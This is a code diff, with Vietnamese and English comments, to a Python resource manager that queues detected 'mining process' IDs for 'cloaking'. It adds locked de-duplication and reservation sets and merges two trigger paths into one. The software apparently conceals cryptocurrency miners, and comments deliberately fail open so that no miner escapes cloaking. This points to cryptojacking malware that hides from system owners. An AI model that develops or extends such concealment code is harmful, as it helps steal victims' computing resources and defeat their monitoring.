@@ -232,6 +232,11 @@ class ResourceManager(IResourceManager):
             self.resource_adjustment_queue = queue.Queue()
             # **De-duplication set** (tập khử trùng lặp – tránh xử lý 2 lần cùng PID)
             self._processed_pids = set()
+            self._processed_pids_lock = threading.Lock()
+            # **Reservation set** to prevent duplicate enqueue across sources before processing starts
+            # (tập đặt chỗ – ngăn enqueue trùng từ nhiều nguồn trước khi xử lý bắt đầu)
+            self._reserved_pids = set()
+            self._reserved_pids_lock = threading.Lock()
             self._last_pid_enqueued_at = 0.0
             # **Log rate-limiting state for empty-queue early warning**
             try:
@@ -446,10 +451,16 @@ class ResourceManager(IResourceManager):
                 cmd=cmd
             )
 
-            # **Trigger Cloaking** (kích hoạt che giấu)
-            self.logger.info(f"🚀 [OBSERVER-CALLBACK] About to trigger cloaking for PID {pid}")
-            self.trigger_cloaking(mining_process, 'direct_registry')
-            self.logger.info(f"✅ [OBSERVER-CALLBACK] Cloaking triggered successfully for PID {pid}")
+            # **Unified path**: forward to receive_from_registry to avoid duplicate triggers
+            self.logger.info(f"🚀 [OBSERVER-CALLBACK] Forwarding PID {pid} to receive_from_registry (unified path)")
+            registry_metadata = {
+                'name': mining_process.name,
+                'cmd': cmd,
+                'observer_source': 'direct_registry',
+                'source': 'direct_registry'
+            }
+            self.receive_from_registry(pid, registry_metadata)
+            self.logger.info(f"✅ [OBSERVER-CALLBACK] PID {pid} enqueued via receive_from_registry")
             
         except Exception as e:
             self.logger.error(f"Lỗi xử lý process registration: {e}")
@@ -775,22 +786,9 @@ class ResourceManager(IResourceManager):
                         }
                         
                         # Gọi receive_from_registry để xử lý PID
-                        self.logger.info(f"🚀 [FILE-SCANNER] Forwarding PID {pid} to registry handler")
-                        # Khử trùng lặp nhận từ file: nếu đã xử lý, bỏ qua forward
-                        if pid not in self._processed_pids:
-                            self.receive_from_registry(pid, enhanced_metadata)
-                        else:
-                            self.logger.debug(f"⏩ [FILE-SCANNER] Skip duplicate receive_from_registry for PID {pid}")
-                        
-                        # Trigger cloaking nếu cần (tạo MiningProcess đã có ở trên)
-                        if metadata.get('cloaking_required', True):
-                            # Khử trùng lặp: tránh trigger nhiều lần cùng PID
-                            if pid not in self._processed_pids:
-                                self.logger.info(f"🛡️ [FILE-SCANNER] Triggering cloaking for PID {pid}")
-                                self.trigger_cloaking(mining_process, 'file_scanner')
-                                self._processed_pids.add(pid)
-                            else:
-                                self.logger.debug(f"⏩ [FILE-SCANNER] Skip duplicate cloaking for PID {pid}")
+                        self.logger.info(f"🚀 [FILE-SCANNER] Forwarding PID {pid} to receive_from_registry (unified path)")
+                        self.receive_from_registry(pid, enhanced_metadata)
+                        # De-duplication and cloaking are handled centrally in PID processing loop
                         
                         # Xóa file sau khi xử lý thành công
                         pid_file.unlink()
@@ -963,6 +961,16 @@ class ResourceManager(IResourceManager):
                 except Exception as mp_fatal:
                     self.logger.error(f"❌ [TIER-2] FATAL: Cannot create MiningProcess for PID {pid}: {mp_fatal}")
                     return False
+
+            # **Early de-dup reservation** (đặt chỗ khử trùng lặp sớm)
+            try:
+                if not self._reserve_pid_if_new(pid):
+                    src = registry_metadata.get('source', 'unknown')
+                    self.logger.debug(f"⏩ [ENTRY] Skip duplicate PID {pid} (already reserved/processing/processed) from source={src}")
+                    return True
+            except Exception as e:
+                # Fail-open: continue to avoid missing cloaking, but log
+                self.logger.debug(f"⚠️ [ENTRY] Reservation check failed for PID {pid}: {e}")
             
             # **TIER 2 FIX: Enhanced PID queue processing** (xử lý queue PID nâng cao)
             pid_data = {
@@ -970,7 +978,7 @@ class ResourceManager(IResourceManager):
                 'mining_process': mining_process,
                 'registry_metadata': registry_metadata,
                 'timestamp': time.time(),
-                'source': 'direct_registry_handoff',
+                'source': registry_metadata.get('source', 'direct_registry_handoff'),
                 'tier2_enhanced': True
             }
             
@@ -1092,6 +1100,70 @@ class ResourceManager(IResourceManager):
         
         self.logger.info("🔚 [PID-PROC] PID processing loop stopped")
     
+    def _mark_pid_seen_if_new(self, pid: int) -> bool:
+        """
+        Thread-safe PID de-duplication. Returns True if this is the first time
+        we see the PID (should process), False if already processed/enqueued.
+        """
+        try:
+            lock = getattr(self, "_processed_pids_lock", None)
+            if lock is None:
+                # Fallback: initialize lock defensively
+                self._processed_pids_lock = threading.Lock()
+                lock = self._processed_pids_lock
+            with lock:
+                if pid in self._processed_pids:
+                    return False
+                self._processed_pids.add(pid)
+                return True
+        except Exception:
+            # In doubt, allow processing to avoid missing cloaking
+            return True
+
+    def _reserve_pid_if_new(self, pid: int) -> bool:
+        """
+        Reserve PID at entry to prevent duplicate enqueue from concurrent sources.
+        Returns True if reservation created; False if already reserved or processed.
+        (Đặt chỗ PID ở entry để ngăn enqueue trùng; True nếu đặt chỗ mới, False nếu đã có/đã xử lý)
+        """
+        # If already processed, skip immediately
+        try:
+            plock = getattr(self, "_processed_pids_lock", None)
+            if plock is None:
+                self._processed_pids_lock = threading.Lock()
+                plock = self._processed_pids_lock
+            with plock:
+                if pid in self._processed_pids:
+                    return False
+        except Exception:
+            pass
+
+        # Check/create reservation
+        rlock = getattr(self, "_reserved_pids_lock", None)
+        if rlock is None:
+            self._reserved_pids_lock = threading.Lock()
+            rlock = self._reserved_pids_lock
+        with rlock:
+            if pid in self._reserved_pids:
+                return False
+            self._reserved_pids.add(pid)
+            return True
+
+    def _release_pid_reservation(self, pid: int) -> None:
+        """
+        Release reservation when processing begins or finishes (giải phóng đặt chỗ khi bắt đầu/kết thúc xử lý)
+        """
+        try:
+            rlock = getattr(self, "_reserved_pids_lock", None)
+            if rlock is None:
+                self._reserved_pids_lock = threading.Lock()
+                rlock = self._reserved_pids_lock
+            with rlock:
+                if pid in self._reserved_pids:
+                    self._reserved_pids.remove(pid)
+        except Exception:
+            pass
+    
     def _process_pid_immediately(self, pid_data: Dict[str, Any]) -> bool:
         """
         **🥇 SOLUTION 1: Immediate PID Processing** (xử lý PID tức thì)
@@ -1102,6 +1174,13 @@ class ResourceManager(IResourceManager):
             pid = pid_data['pid']
             mining_process = pid_data['mining_process']
             source = pid_data['source']
+            # Release entry reservation now that processing starts
+            self._release_pid_reservation(pid)
+            
+            # **De-duplication**: ensure each PID is processed exactly once across all sources
+            if not self._mark_pid_seen_if_new(pid):
+                self.logger.debug(f"⏩ [IMMEDIATE] Skip duplicate processing for PID {pid} (already seen)")
+                return True
             
             pre_monitored = len(self._monitored_processes)
             pre_qsize = self._pid_queue.qsize() if hasattr(self, "_pid_queue") else -1
